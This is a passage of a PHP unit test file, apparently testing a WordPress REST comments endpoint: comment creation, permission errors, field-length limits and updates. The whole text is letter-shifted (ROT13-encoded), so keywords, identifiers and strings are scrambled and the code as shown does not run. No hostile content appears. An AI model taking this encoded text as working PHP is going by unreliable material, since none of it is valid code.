		$guvf->nffregFnzr( '127.0.0.3', $arj_pbzzrag->pbzzrag_nhgube_VC );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_vainyvq_nhgube_VC() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf  = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'nhgube_vc'    => '867.5309',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
			'fgnghf'       => 'nccebirq',
		);
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_nhgube_vc_ab_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'nhgube_vc'    => '10.0.10.1',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
			'fgnghf'       => 'nccebirq',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_nhgube_vc', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_nhgube_vc_qrsnhygf_gb_erzbgr_nqqe() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$_FREIRE['ERZBGR_NQQE'] = '127.0.0.2';

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr    = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn        = $erfcbafr->trg_qngn();
		$arj_pbzzrag = trg_pbzzrag( $qngn['vq'] );
		$guvf->nffregFnzr( '127.0.0.2', $arj_pbzzrag->pbzzrag_nhgube_VC );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_ab_cbfg_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
			'fgnghf'       => 'nccebirq',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_cbfg_vq', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_ab_cbfg_vq_ab_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'nhgube_anzr'  => 'Ubzre Wnl Fvzcfba',
			'nhgube_rznvy' => 'puhaxlybire53@nby.pbz',
			'nhgube_hey'   => 'uggc://pbzchtybonyulcrezrtnarg.pbz',
			'pbagrag'      => 'Urer\’f gb nypbuby: gur pnhfr bs, naq fbyhgvba gb, nyy bs yvsr\’f ceboyrzf.',
			'nhgube'       => frys::$fhofpevore_vq,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_cbfg_vq', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_vainyvq_cbfg_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'nhgube_anzr'  => 'Ubzre Wnl Fvzcfba',
			'nhgube_rznvy' => 'puhaxlybire53@nby.pbz',
			'nhgube_hey'   => 'uggc://pbzchtybonyulcrezrtnarg.pbz',
			'pbagrag'      => 'Urer\’f gb nypbuby: gur pnhfr bs, naq fbyhgvba gb, nyy bs yvsr\’f ceboyrzf.',
			'fgnghf'       => 'nccebirq',
			'cbfg'         => ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_cbfg_vq', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_qensg_cbfg() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$qensg_vq,
			'nhgube_anzr'  => 'Vfuznry',
			'nhgube_rznvy' => 'urezna-zryivyyr@rneguyvax.arg',
			'nhgube_hey'   => 'uggcf://ra.jvxvcrqvn.bet/jvxv/Urezna_Zryivyyr',
			'pbagrag'      => 'Pnyy zr Vfuznry.',
			'nhgube'       => frys::$fhofpevore_vq,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_qensg_cbfg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_genfu_cbfg() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$genfu_vq,
			'nhgube_anzr'  => 'Vfuznry',
			'nhgube_rznvy' => 'urezna-zryivyyr@rneguyvax.arg',
			'nhgube_hey'   => 'uggcf://ra.jvxvcrqvn.bet/jvxv/Urezna_Zryivyyr',
			'pbagrag'      => 'Pnyy zr Vfuznry.',
			'nhgube'       => frys::$fhofpevore_vq,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_genfu_cbfg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_cevingr_cbfg_vainyvq_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cevingr_vq,
			'nhgube_anzr'  => 'Ubzre Wnl Fvzcfba',
			'nhgube_rznvy' => 'puhaxlybire53@nby.pbz',
			'nhgube_hey'   => 'uggc://pbzchtybonyulcrezrtnarg.pbz',
			'pbagrag'      => 'V\’q or n irtrgnevna vs onpba terj ba gerrf.',
			'nhgube'       => frys::$fhofpevore_vq,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq_cbfg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_cnffjbeq_cbfg_vainyvq_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cnffjbeq_vq,
			'nhgube_anzr'  => 'Ubzre Wnl Fvzcfba',
			'nhgube_rznvy' => 'puhaxlybire53@nby.pbz',
			'nhgube_hey'   => 'uggc://pbzchtybonyulcrezrtnarg.pbz',
			'pbagrag'      => 'V\’q or n irtrgnevna vs onpba terj ba gerrf.',
			'nhgube'       => frys::$fhofpevore_vq,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq_cbfg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_vgrz_qhcyvpngr() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
				'pbzzrag_nhgube'       => 'Thl A. Pbtavgb',
				'pbzzrag_nhgube_rznvy' => 'puhaxlybire53@nby.pb.hx',
				'pbzzrag_pbagrag'      => 'Ubzre? Jub vf Ubzre? Zl anzr vf Thl A. Pbtavgb.',
			)
		);

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Thl A. Pbtavgb',
			'nhgube_rznvy' => 'puhaxlybire53@nby.pb.hx',
			'pbagrag'      => 'Ubzre? Jub vf Ubzre? Zl anzr vf Thl A. Pbtavgb.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 409, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_pybfrq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'pbzzrag_fgnghf' => 'pybfrq',
			)
		);

		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg' => $cbfg_vq,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_erdhver_ybtva() {
		jc_frg_pheerag_hfre( 0 );

		hcqngr_bcgvba( 'pbzzrag_ertvfgengvba', 1 );
		nqq_svygre( 'erfg_nyybj_nabalzbhf_pbzzragf', '__erghea_gehr' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cbfg', frys::$cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'erfg_pbzzrag_ybtva_erdhverq', $qngn['pbqr'] );
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_nhgube() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'    => frys::$cbfg_vq,
			'nhgube'  => ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE,
			'pbagrag' => 'Vg\'f nyy bire\, crbcyr! Jr qba\'g unir n cenlre!',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_nhgube_vainyvq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_vgrz_chyy_nhgube_vasb() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$nhgube = arj JC_Hfre( frys::$nhgube_vq );
		$cnenzf = neenl(
			'cbfg'    => frys::$cbfg_vq,
			'nhgube'  => frys::$nhgube_vq,
			'pbagrag' => 'Vg\'f nyy bire\, crbcyr! Jr qba\'g unir n cenlre!',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$erfhyg = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( frys::$nhgube_vq, $erfhyg['nhgube'] );
		$guvf->nffregFnzr( 'Frn Pncgnva', $erfhyg['nhgube_anzr'] );
		$guvf->nffregFnzr( 'pncgnva@gurselvatqhgpuzna.pbz', $erfhyg['nhgube_rznvy'] );
		$guvf->nffregFnzr( 'uggc://gurselvatqhgpuzna.pbz', $erfhyg['nhgube_hey'] );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_gjb_gvzrf() {
		nqq_svygre( 'erfg_nyybj_nabalzbhf_pbzzragf', '__erghea_gehr' );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'pbagrag'      => 'Funxrf svfg ng fxl',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba nabalzbhf_pbzzragf_pnyyonpx_ahyy() {
		// V'z n cyhtva qrirybcre jub sbetbg gb vapyhqr n erghea inyhr
		// sbe fbzr pbqr cngu va zl 'erfg_nyybj_nabalzbhf_pbzzragf' svygre.
	}

	choyvp shapgvba grfg_nyybj_nabalzbhf_pbzzragf_ahyy() {
		nqq_svygre( 'erfg_nyybj_nabalzbhf_pbzzragf', neenl( $guvf, 'nabalzbhf_pbzzragf_pnyyonpx_ahyy' ), 10, 2 );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		erzbir_svygre( 'erfg_nyybj_nabalzbhf_pbzzragf', neenl( $guvf, 'nabalzbhf_pbzzragf_pnyyonpx_ahyy' ), 10, 2 );

		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_ybtva_erdhverq', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 38477
	 */
	choyvp shapgvba grfg_perngr_pbzzrag_nhgube_anzr_gbb_ybat() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => enaq_ybat_fge( 246 ),
			'nhgube_rznvy' => 'zhecul@tvatvivgvf.pbz',
			'nhgube_hey'   => 'uggc://wnmm.tvatvivgvf.pbz',
			'pbagrag'      => 'Guvf vfa\'g n fnkbcubar. Vg\'f na hzoeryyn.',
			'qngr'         => '1995-04-30G10:22:00',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'pbzzrag_nhgube_pbyhza_yratgu', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 38477
	 */
	choyvp shapgvba grfg_perngr_pbzzrag_nhgube_rznvy_gbb_ybat() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Oyrrqvat Thzf Zhecul',
			'nhgube_rznvy' => 'zhecul@' . enaq_ybat_fge( 190 ) . '.pbz',
			'nhgube_hey'   => 'uggc://wnmm.tvatvivgvf.pbz',
			'pbagrag'      => 'Guvf vfa\'g n fnkbcubar. Vg\'f na hzoeryyn.',
			'qngr'         => '1995-04-30G10:22:00',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'pbzzrag_nhgube_rznvy_pbyhza_yratgu', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 38477
	 */
	choyvp shapgvba grfg_perngr_pbzzrag_nhgube_hey_gbb_ybat() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Oyrrqvat Thzf Zhecul',
			'nhgube_rznvy' => 'zhecul@tvatvivgvf.pbz',
			'nhgube_hey'   => 'uggc://wnmm.' . enaq_ybat_fge( 185 ) . '.pbz',
			'pbagrag'      => 'Guvf vfa\'g n fnkbcubar. Vg\'f na hzoeryyn.',
			'qngr'         => '1995-04-30G10:22:00',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'pbzzrag_nhgube_hey_pbyhza_yratgu', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 38477
	 */
	choyvp shapgvba grfg_perngr_pbzzrag_pbagrag_gbb_ybat() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Oyrrqvat Thzf Zhecul',
			'nhgube_rznvy' => 'zhecul@tvatvivgvf.pbz',
			'nhgube_hey'   => 'uggc://wnmm.tvatvivgvf.pbz',
			'pbagrag'      => enaq_ybat_fge( 66525 ),
			'qngr'         => '1995-04-30G10:22:00',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'pbzzrag_pbagrag_pbyhza_yratgu', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_jvgubhg_cnffjbeq() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cnffjbeq_vq,
			'nhgube_anzr'  => 'Oyrrqvat Thzf Zhecul',
			'nhgube_rznvy' => 'zhecul@tvatvivgvf.pbz',
			'nhgube_hey'   => 'uggc://wnmm.tvatvivgvf.pbz',
			'pbagrag'      => 'Guvf vfa\'g n fnkbcubar. Vg\'f na hzoeryyn.',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq_cbfg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_pbzzrag_jvgu_cnffjbeq() {
		nqq_svygre( 'erfg_nyybj_nabalzbhf_pbzzragf', '__erghea_gehr' );

		$cnenzf = neenl(
			'cbfg'         => frys::$cnffjbeq_vq,
			'nhgube_anzr'  => 'Oyrrqvat Thzf Zhecul',
			'nhgube_rznvy' => 'zhecul@tvatvivgvf.pbz',
			'nhgube_hey'   => 'uggc://wnmm.tvatvivgvf.pbz',
			'pbagrag'      => 'Guvf vfa\'g n fnkbcubar. Vg\'f na hzoeryyn.',
			'cnffjbeq'     => 'gbbznalfrpergf',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );

		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_hcqngr_vgrz() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'nhgube'       => frys::$fhofpevore_vq,
			'nhgube_anzr'  => 'Qvfpb Fgh',
			'nhgube_hey'   => 'uggc://fghfqvfpb.pbz',
			'nhgube_rznvy' => 'fgh@fghfqvfpb.pbz',
			'nhgube_vc'    => '4.4.4.4',
			'pbagrag'      => 'Grfgvat.',
			'qngr'         => '2014-11-07G10:14:25',
			'cbfg'         => $cbfg_vq,
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbzzrag = $erfcbafr->trg_qngn();
		$hcqngrq = trg_pbzzrag( frys::$nccebirq_vq );
		$guvf->nffregFnzr( $cnenzf['pbagrag'], $pbzzrag['pbagrag']['enj'] );
		$guvf->nffregFnzr( $cnenzf['nhgube'], $pbzzrag['nhgube'] );
		$guvf->nffregFnzr( $cnenzf['nhgube_anzr'], $pbzzrag['nhgube_anzr'] );
		$guvf->nffregFnzr( $cnenzf['nhgube_hey'], $pbzzrag['nhgube_hey'] );
		$guvf->nffregFnzr( $cnenzf['nhgube_rznvy'], $pbzzrag['nhgube_rznvy'] );
		$guvf->nffregFnzr( $cnenzf['nhgube_vc'], $pbzzrag['nhgube_vc'] );
		$guvf->nffregFnzr( $cnenzf['cbfg'], $pbzzrag['cbfg'] );

		$guvf->nffregFnzr( zlfdy_gb_esp3339( $hcqngrq->pbzzrag_qngr ), $pbzzrag['qngr'] );
		$guvf->nffregFnzr( '2014-11-07G10:14:25', $pbzzrag['qngr'] );
	}

	/**
	 * @qngnCebivqre qngn_pbzzrag_qngrf
	 */
	choyvp shapgvba grfg_hcqngr_pbzzrag_qngr( $cnenzf, $erfhygf ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', $cnenzf['gvzrmbar_fgevat'] );

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', $pbzzrag_vq ) );
		vs ( vffrg( $cnenzf['qngr'] ) ) {
			$erdhrfg->frg_cnenz( 'qngr', $cnenzf['qngr'] );
		}
		vs ( vffrg( $cnenzf['qngr_tzg'] ) ) {
			$erdhrfg->frg_cnenz( 'qngr_tzg', $cnenzf['qngr_tzg'] );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', '' );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn    = $erfcbafr->trg_qngn();
		$pbzzrag = trg_pbzzrag( $qngn['vq'] );

		$guvf->nffregFnzr( $erfhygf['qngr'], $qngn['qngr'] );
		$pbzzrag_qngr = fge_ercynpr( 'G', ' ', $erfhygf['qngr'] );
		$guvf->nffregFnzr( $pbzzrag_qngr, $pbzzrag->pbzzrag_qngr );

		$guvf->nffregFnzr( $erfhygf['qngr_tzg'], $qngn['qngr_tzg'] );
		$pbzzrag_qngr_tzg = fge_ercynpr( 'G', ' ', $erfhygf['qngr_tzg'] );
		$guvf->nffregFnzr( $pbzzrag_qngr_tzg, $pbzzrag->pbzzrag_qngr_tzg );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_ab_pbagrag() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->frg_cnenz( 'nhgube_rznvy', 'nabgure@rznvy.pbz' );

		// Fraqvat n erdhrfg jvgubhg pbagrag vf svar.
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		// Fraqvat n erdhrfg jvgu rzcgl pbzzrag vf abg svar.
		$erdhrfg->frg_cnenz( 'nhgube_rznvy', 'lrgnabgure@rznvy.pbz' );
		$erdhrfg->frg_cnenz( 'pbagrag', '' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_pbagrag_vainyvq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_ab_punatr() {
		$pbzzrag = trg_pbzzrag( frys::$nccebirq_vq );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

